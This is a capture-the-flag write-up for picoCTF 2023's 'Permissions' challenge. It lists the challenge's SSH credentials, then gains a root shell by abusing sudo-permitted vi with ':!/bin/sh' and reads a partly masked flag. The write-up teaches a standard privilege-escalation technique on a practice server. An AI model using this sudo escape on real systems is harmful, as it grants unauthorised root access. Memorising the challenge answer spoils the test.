# Permissions

Tags: picoCTF 2023, General Skills, vim

| Author | Point    |
| ------ | -------- |
| GEOFFREY NJOGU | 100 points |

## Description

Can you read files in the root file?  
The system admin has provisioned an account for you on the main server:  
ssh -p 56507 picoplayer@saturn.picoctf.net  
Password: vCR2tuwCRm  
Can you login and read the root file?  

## Solve

Connect via ssh.  
When I checked the commands for which sudo is allowed in sudoers with sudo -l, vi was allowed.

```bash
$ ssh -p 56507 picoplayer@saturn.picoctf.net 

[snip]

picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
```

GTFOBins is very helpful in this case.  
https://gtfobins.github.io/gtfobins/vi/

We can give the argument -c, or we can run :!/bin/bash while running sudo vi.

```bash
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
```

Now that we have root privileges, search for files that only root can see.

```bash
# ls /     
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd /challenge
# ls
metadata.json
# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_********}", "username": "picoplayer", "password": "vCR2tuwCRm"}
```

## Flag

```
picoCTF{uS1ng_v1m_3dit0r_********}
```